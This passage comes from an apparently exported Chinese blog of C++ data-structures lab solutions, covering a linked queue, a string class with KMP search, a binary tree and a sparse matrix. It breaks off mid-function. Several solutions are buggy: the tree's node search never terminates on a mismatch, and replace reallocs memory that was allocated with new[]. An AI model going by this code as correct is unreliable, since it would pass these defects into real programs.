<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LinkQueue::pop_front</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rear == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    QueueNode *temp = fore;</span><br><span class="line">    fore =  fore-&gt;next;</span><br><span class="line">    <span class="keyword">delete</span> temp;</span><br><span class="line">    temp = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-front-1"><a href="#0x04-front-1" class="headerlink" title="0x04 front"></a>0x04 front</h2><p>返回队首处的值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LinkQueue::front</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fore-&gt;value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x05-析构函数-1"><a href="#0x05-析构函数-1" class="headerlink" title="0x05 析构函数"></a>0x05 析构函数</h2><p>逐结点释放内存（<strong>同链表</strong>）。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LinkQueue::~LinkQueue()&#123;</span><br><span class="line">    <span class="keyword">while</span> (fore != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        QueueNode* temp = fore;</span><br><span class="line">        fore = fore-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line">        temp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rear = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会实现「字符串」？</title>
    <url>/Data-Structures-Experiment-6/</url>
    <content><![CDATA[<p>Data Structures Experiment #6 - 封装字符串类。</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<ul>
<li><p><code>MyString.h</code>中的<code>private</code>需要添加必要的成员变量。并实现<code>MyString.cpp</code>中的接口方法。</p>
</li>
<li><p><code>MyString::MyString(const char* str);</code><br>构造函数，使用<code>str</code>构造<code>MyString</code>实例。</p>
</li>
<li><p><code>MyString::~MyString();</code><br>析构函数。</p>
</li>
<li><p><code>int MyString::length() const;</code><br>返回储存字符串的长度。</p>
</li>
<li><p><code>void MyString::replace(const char* replace, int loc);</code><br>将字符串中，从<code>loc</code>开始替换为<code>replace</code>。</p>
<p>例如，假设<code>MyString</code>实例<code>msa</code>储存的字符串为“<code>hello</code>”,执行<code>msa.replace(&quot;str&quot;, 1)</code>后，<code>msa</code>中储存的字符串变为 “<code>hstr</code>”。</p>
</li>
<li><p><code>int MyString::find(const char* str) const;</code><br>在<code>MyString</code>实例中查找<code>str</code>第一次出现的位置。如果实例中不包含<code>str</code>，则返回<code>-1</code>。注意，需要使用KMP方法实现。<br>例如<code>MyString</code>实例<code>msa</code>储存的字符串为“<code>aaabab</code>”， 执行<code>msa.find(&quot;ab&quot;)</code>返回2。<code>msa.find(&quot;abc&quot;) </code>返回-1。</p>
</li>
<li><p><code>const char* MyString::c_string() const;</code><br>返回储存在实例中字符串。</p>
</li>
</ul>
</blockquote>
<h1 id="0x00-数据域封装"><a href="#0x00-数据域封装" class="headerlink" title="0x00 数据域封装"></a>0x00 数据域封装</h1><p>字符数组及其长度。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span>* myStr;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br></pre></td></tr></table></figure>
<h1 id="0x01-构造函数"><a href="#0x01-构造函数" class="headerlink" title="0x01 构造函数"></a>0x01 构造函数</h1><p>长度即为输入串的长度，对字符指针分配内存并拷贝，末尾加<code>&#39;\0&#39;</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">MyString::MyString(<span class="keyword">const</span> <span class="keyword">char</span>* str)&#123;</span><br><span class="line">    len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    myStr = <span class="keyword">new</span> <span class="keyword">char</span>[len + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(myStr, str);</span><br><span class="line">    myStr[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x02-length"><a href="#0x02-length" class="headerlink" title="0x02 length"></a>0x02 length</h1><p>直接返回长度。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MyString::length</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-replace"><a href="#0x03-replace" class="headerlink" title="0x03 replace"></a>0x03 replace</h1><p>如果替换后长度增加，则需要重新分配内存。</p>
<p>再从<code>loc</code>处开始拷贝。</p>
<p>长度改变。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyString::replace</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* rep, <span class="keyword">int</span> loc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rLen = <span class="built_in">strlen</span>(rep);</span><br><span class="line">    <span class="keyword">if</span> ((loc + rLen) &gt; len) &#123;</span><br><span class="line">        myStr = (<span class="keyword">char</span>*)<span class="built_in">realloc</span>(myStr, loc + rLen + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = loc; i &lt; loc + rLen; i++)</span><br><span class="line">        myStr[i] = rep[i - loc];</span><br><span class="line">    myStr[loc + rLen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    len = loc + rLen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x04-find"><a href="#0x04-find" class="headerlink" title="0x04 find"></a>0x04 find</h1><p>利用KMP方法。</p>
<ul>
<li><p>首先获取<code>next</code>数组：</p>
<p>子串<code>str</code>自身匹配，求最大匹配数（第12行）。</p>
</li>
<li><p>获取<code>next</code>数组后开始对比：</p>
<p><code>myStr</code>串不回溯，每当不匹配时<code>str</code>串索引<code>j</code>回溯到<code>next[j]</code>处。当<code>j == strlen(str)</code>时说明已找到，否则未找到。</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MyString::find</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> next[<span class="built_in">strlen</span>(str)];</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="built_in">strlen</span>(str)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">-1</span> || str[i] == str[j]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            j = next[j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; len &amp;&amp; (j == <span class="number">-1</span> || j &lt; <span class="built_in">strlen</span>(str))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">-1</span> || myStr[i] == str[j]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            j = next[j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (j == <span class="built_in">strlen</span>(str))</span><br><span class="line">        <span class="keyword">return</span> i - j;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x05-c-string"><a href="#0x05-c-string" class="headerlink" title="0x05 c_string"></a>0x05 c_string</h1><p>返回字符数组。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">MyString::c_string</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> myStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x06-析构函数"><a href="#0x06-析构函数" class="headerlink" title="0x06 析构函数"></a>0x06 析构函数</h1><p>释放内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">MyString::~MyString()&#123;</span><br><span class="line">    <span class="keyword">if</span> (myStr) &#123;</span><br><span class="line">        <span class="keyword">delete</span>[] myStr;</span><br><span class="line">        myStr = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会实现「二叉树」？</title>
    <url>/Data-Structures-Experiment-8/</url>
    <content><![CDATA[<p>Data Structures Experiment #8 - 实现一个二叉树类。</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<ul>
<li><code>BinTree();</code><br>构造函数，构造一个空的二叉排序树。</li>
<li><code> ~BinTree();</code><br>析构函数，将二叉排序树销毁。</li>
<li><code>void insert(int val, int parent, int flg);</code><br>将值为<code>val</code>的元素插入到二叉树中。此节点的父节点编号为<code>parent</code>，如果<code>parent</code>项为0，表示插入元素为根结点。如果<code>flg</code>为-1，则此节点为父节点的左子，如果<code>flg</code>为1，则此节点为父节点的右子。<br>二叉树的节点编号按照插入顺序逐一递增，编号从1开始。<br>例如：<ul>
<li><code>tree.insert(10, 0, 0);</code> 插入编号为1的根结点；</li>
<li><code>tree.insert(20, 1, 1);</code> 插入编号为2的节点，节点是根结点的右子。</li>
</ul>
</li>
<li><code>int* p_traversal() const;</code><br>前序遍历二叉树，并将结果保存到int<em>中返回。</em></li>
<li><code>int* m_traversal() const;</code><br>中序遍历二叉树，并将结果保存到int*中返回</li>
<li><code>int height() const;</code><br>获得二叉树高度。</li>
<li><code>int countNode() const;</code><br>获得二叉树的节点总个数。</li>
</ul>
</blockquote>
<h1 id="0x00-数据域封装"><a href="#0x00-数据域封装" class="headerlink" title="0x00 数据域封装"></a>0x00 数据域封装</h1><p>定义二叉树结点结构体，包括数值、序号、左子树和右子树。</p>
<p>创建二叉树，定义计数器。</p>
<p>定义一些后续会用到的递归函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinNode</span> &#123;</span></span><br><span class="line">      <span class="keyword">int</span> data, number;</span><br><span class="line">      BinNode* lChild;</span><br><span class="line">      BinNode* rChild;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    BinNode* root;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">destroyTree</span><span class="params">(BinNode* Tree)</span></span>;</span><br><span class="line">    <span class="function">BinNode* <span class="title">search_number</span><span class="params">(BinNode* Tree, <span class="keyword">int</span> num)</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">p_order</span><span class="params">(BinNode* Tree, <span class="keyword">int</span>* &amp;pointer, <span class="keyword">int</span> &amp;index)</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">m_order</span><span class="params">(BinNode* Tree, <span class="keyword">int</span>* &amp;pointer, <span class="keyword">int</span> &amp;index)</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getHeight</span><span class="params">(BinNode* Tree)</span> <span class="keyword">const</span></span>;</span><br></pre></td></tr></table></figure>
<h1 id="0x01-构造函数"><a href="#0x01-构造函数" class="headerlink" title="0x01 构造函数"></a>0x01 构造函数</h1><p>二叉树初始化为空。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BinTree::BinTree()&#123;</span><br><span class="line">    root = <span class="literal">NULL</span>;</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x02-insert"><a href="#0x02-insert" class="headerlink" title="0x02 insert"></a>0x02 insert</h1><p>插入结点需要先找到父结点，所以先写一个递归函数用于找到某个结点。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BinNode* <span class="title">BinTree::search_number</span><span class="params">(BinNode* Tree, <span class="keyword">int</span> num)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (Tree) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Tree-&gt;number == num)</span><br><span class="line">            <span class="keyword">return</span> Tree;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            search_number(Tree-&gt;lChild, num);</span><br><span class="line">            search_number(Tree-&gt;rChild, num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>新建一个结点，各属性赋值。</p>
<ul>
<li><p>如果是根结点，则直接链入；</p>
</li>
<li><p>如果不是根结点，则对应链入父结点的左子或右子，其中父结点通过上一函数找到。</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BinTree::insert</span><span class="params">(<span class="keyword">int</span> val, <span class="keyword">int</span> parent, <span class="keyword">int</span> flg)</span> </span>&#123;</span><br><span class="line">    BinNode* newNode = <span class="keyword">new</span> BinNode;</span><br><span class="line">    newNode-&gt;data = val;</span><br><span class="line">    newNode-&gt;number = count + <span class="number">1</span>;</span><br><span class="line">    newNode-&gt;lChild = newNode-&gt;rChild = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (parent == <span class="number">0</span>)</span><br><span class="line">        root = newNode;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (flg == <span class="number">-1</span>)</span><br><span class="line">            search_number(root, parent)-&gt;lChild = newNode;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (flg == <span class="number">1</span>)</span><br><span class="line">            search_number(root, parent)-&gt;rChild = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-p-traversal"><a href="#0x03-p-traversal" class="headerlink" title="0x03 p_traversal"></a>0x03 p_traversal</h1><p>前序遍历的递归函数表示（注意此处要<strong>引用传递</strong>）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BinTree::p_order</span><span class="params">(BinNode* Tree, <span class="keyword">int</span>* &amp;pointer, <span class="keyword">int</span> &amp;index)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Tree) &#123;</span><br><span class="line">        pointer[index++] = Tree-&gt;data;</span><br><span class="line">        p_order(Tree-&gt;lChild, pointer, index);</span><br><span class="line">        p_order(Tree-&gt;rChild, pointer, index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在递归的基础上：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">BinTree::p_traversal</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* p = <span class="keyword">new</span> <span class="keyword">int</span>[count];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    p_order(root, p, i);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x04-m-traversal"><a href="#0x04-m-traversal" class="headerlink" title="0x04 m_traversal"></a>0x04 m_traversal</h1><p>中序遍历的递归函数表示（注意此处要<strong>引用传递</strong>）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BinTree::m_order</span><span class="params">(BinNode* Tree, <span class="keyword">int</span>* &amp;pointer, <span class="keyword">int</span> &amp;index)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Tree) &#123;</span><br><span class="line">        m_order(Tree-&gt;lChild, pointer, index);</span><br><span class="line">        pointer[index++] = Tree-&gt;data;</span><br><span class="line">        m_order(Tree-&gt;rChild, pointer, index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在递归的基础上：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">BinTree::m_traversal</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* p = <span class="keyword">new</span> <span class="keyword">int</span>[count];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    m_order(root, p, i);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x05-countNode"><a href="#0x05-countNode" class="headerlink" title="0x05 countNode"></a>0x05 countNode</h1><p>返回结点个数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinTree::countNode</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x06-height"><a href="#0x06-height" class="headerlink" title="0x06 height"></a>0x06 height</h1><p>递归遍历求二叉树高度。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinTree::getHeight</span><span class="params">(BinNode* Tree)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Tree == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> m = getHeight(Tree-&gt;lChild);</span><br><span class="line">        <span class="keyword">int</span> n = getHeight(Tree-&gt;rChild);</span><br><span class="line">        <span class="keyword">return</span> (m &gt; n) ? m + <span class="number">1</span> : n + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接调用：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinTree::height</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getHeight(root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x07-析构函数"><a href="#0x07-析构函数" class="headerlink" title="0x07 析构函数"></a>0x07 析构函数</h1><p>递归销毁二叉树：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BinTree::destroyTree</span><span class="params">(BinNode* Tree)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (Tree) &#123;</span><br><span class="line">        BinNode* left = Tree-&gt;lChild;</span><br><span class="line">        BinNode* right = Tree-&gt;rChild;</span><br><span class="line">        <span class="keyword">delete</span> Tree;</span><br><span class="line">        Tree = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (left)</span><br><span class="line">            destroyTree(left);</span><br><span class="line">        <span class="keyword">if</span> (right)</span><br><span class="line">            destroyTree(right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接调用：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BinTree::~BinTree()&#123;</span><br><span class="line">    destroyTree(root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会实现「稀疏矩阵」？</title>
    <url>/Data-Structures-Experiment-7/</url>
    <content><![CDATA[<p>Data Structures Experiment #7 - 实现稀疏矩阵的三元组形式。</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p>通常认为矩阵中非零元素的总数比上矩阵所有元素总数的值小于等于0.05时，则称该矩阵为稀疏矩阵。</p>
<p>本次实验要求以三元组的形式实现稀疏矩阵。需要SPMartix类的接口有:</p>
<ul>
<li><p><code>SPMatrix::SPMatrix(int r, int c);</code><br>构造函数，构造一个r行c列的稀疏矩阵。</p>
</li>
<li><p><code>SPMatrix::SPMatrix(int r, int c, int max_element);</code><br>构造函数，构造一个r行c列，元素最多为max_element个的稀疏矩阵。</p>
</li>
<li><p><code>int SPMatrix::get(int i, int j);</code><br>获取矩阵中i行j列的值。如果没有元素，则返回0</p>
</li>
<li><p><code>void SPMatrix::rotate();</code><br>实现稀疏矩阵的转置操作。</p>
</li>
<li><p><code>int SPMatrix::set(int i, int j, int val);</code><br>将i行j列的值设置为val。</p>
</li>
<li><p><code>SPMatrix SPMatrix::operator+(const SPMatrix&amp; b);</code><br>重载矩阵的加法操作。</p>
</li>
<li><p><code>SPMatrix SPMatrix::operator-(const SPMatrix&amp; b);</code><br>重载稀疏矩阵的减法操作。</p>
</li>
<li><p><code>SPMatrix SPMatrix::operator*(const SPMatrix&amp; b);</code><br>重载稀疏矩阵中的乘法操作。</p>
</li>
</ul>
</blockquote>
<h1 id="0x00-数据域封装"><a href="#0x00-数据域封装" class="headerlink" title="0x00 数据域封装"></a>0x00 数据域封装</h1><p>对于矩阵来说，其属性值包括总行数和总列数，而稀疏矩阵还应包括非零元素的个数。</p>
<p>稀疏矩阵是用三元组存取的，所以定义三元组每个结点的结构，包括行标、列标和元素数值。最后将每个结点存到三元组中。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> mu, nu, tu;</span><br><span class="line">    Triple* data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Triple</span> &#123;</span></span><br><span class="line">        <span class="keyword">int</span> row, col;</span><br><span class="line">        <span class="keyword">int</span> value;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
<h1 id="0x01-构造函数"><a href="#0x01-构造函数" class="headerlink" title="0x01 构造函数"></a>0x01 构造函数</h1><p>构造一个稀疏矩阵，当给出最大元素个数时，动态分配<code>max_element</code>个内存空间，未给出时则分配<code>r * c</code>个（有无更好的方法？）。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SPMatrix::SPMatrix(<span class="keyword">int</span> r, <span class="keyword">int</span> c)&#123;</span><br><span class="line">    data = <span class="keyword">new</span> Triple[r * c];</span><br><span class="line">    mu = r;</span><br><span class="line">    nu = c;</span><br><span class="line">    tu = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SPMatrix::SPMatrix(<span class="keyword">int</span> r, <span class="keyword">int</span> c, <span class="keyword">int</span> max_element)&#123;</span><br><span class="line">    data = <span class="keyword">new</span> Triple[max_element];</span><br><span class="line">    mu = r;</span><br><span class="line">    nu = c;</span><br><span class="line">    tu = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x02-set函数"><a href="#0x02-set函数" class="headerlink" title="0x02 set函数"></a>0x02 set函数</h1><p>直接将参数存入三元组，存完后非零元素个数增1。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SPMatrix::set</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">    data[tu].row = i;</span><br><span class="line">    data[tu].col = j;</span><br><span class="line">    data[tu].value = val;</span><br><span class="line">    tu++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-get函数"><a href="#0x03-get函数" class="headerlink" title="0x03 get函数"></a>0x03 get函数</h1><p>将三元组从头遍历，找对应行和列的元素值，未找到则返回0。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SPMatrix::get</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span><span class="keyword">const</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; tu; k++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (data[k].row == i &amp;&amp; data[k].col == j)</span><br><span class="line">            <span class="keyword">return</span> data[k].value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x04-转置函数"><a href="#0x04-转置函数" class="headerlink" title="0x04 转置函数"></a>0x04 转置函数</h1><p>首先将矩阵的型变换，即行数变列数、列数变行数。</p>
<p>其次将三元组的每个结点行标变列标、列标变行标。</p>
<blockquote>
<p>注：稀疏矩阵的转置还需对三元组重新排序，由于本算法在读取时并未对其排序，故此处从略。“一个稀疏矩阵A<sub>m*n</sub>采用三元组形式表示，若把三元组中有关行下标与列下标的值互换，并把m和n的值互换，则就完成了A<sub>m*n</sub>的转置运算。”这一说法是错误的。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SPMatrix::rotate</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = mu;</span><br><span class="line">    mu = nu;</span><br><span class="line">    nu = temp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; tu; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> temp = data[k].row;</span><br><span class="line">        data[k].row = data[k].col;</span><br><span class="line">        data[k].col = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x05-重载加法运算符"><a href="#0x05-重载加法运算符" class="headerlink" title="0x05 重载加法运算符"></a>0x05 重载加法运算符</h1><p>另构造一和矩阵来存储两矩阵之和。</p>
<p>两矩阵可加的前提是两矩阵同型，应该先作判断。</p>
<p>矩阵的加法即对应位置元素相加，将矩阵视为数组以便于运算。</p>
<p>两矩阵对应位置不一定都存在元素，即数组的<code>loc</code>不一定相同，应分别判断。</p>
<p>每次加完后，和矩阵的非零元素数增1。</p>
<p>最后考虑某一个矩阵的非零元素已经全部遍历完成，此时将另一矩阵剩余元素加到和矩阵里。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SPMatrix SPMatrix::<span class="keyword">operator</span>+(<span class="keyword">const</span> SPMatrix&amp; b)&#123;</span><br><span class="line">    <span class="function">SPMatrix <span class="title">add</span><span class="params">(mu, nu)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (b.mu != mu || b.nu != nu)</span><br><span class="line">        <span class="keyword">return</span> add;</span><br><span class="line">    add.mu = mu;</span><br><span class="line">    add.nu = nu;</span><br><span class="line">    add.tu = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, aLoc, bLoc;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; tu &amp;&amp; j &lt; b.tu) &#123;</span><br><span class="line">        aLoc = data[i].row * nu + data[i].col;</span><br><span class="line">        bLoc = b.data[j].row * b.nu + b.data[j].col;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (aLoc &lt; bLoc) &#123;</span><br><span class="line">            add.data[add.tu].row = data[i].row;</span><br><span class="line">            add.data[add.tu].col = data[i].col;</span><br><span class="line">            add.data[add.tu].value = data[i].value;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (aLoc &gt; bLoc) &#123;</span><br><span class="line">            add.data[add.tu].row = b.data[j].row;</span><br><span class="line">            add.data[add.tu].col = b.data[j].col;</span><br><span class="line">            add.data[add.tu].value = b.data[j].value;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (aLoc == bLoc) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data[i].value + b.data[j].value) &#123;</span><br><span class="line">                add.data[add.tu].row = data[i].row;</span><br><span class="line">                add.data[add.tu].col = data[i].col;</span><br><span class="line">                add.data[add.tu].value = 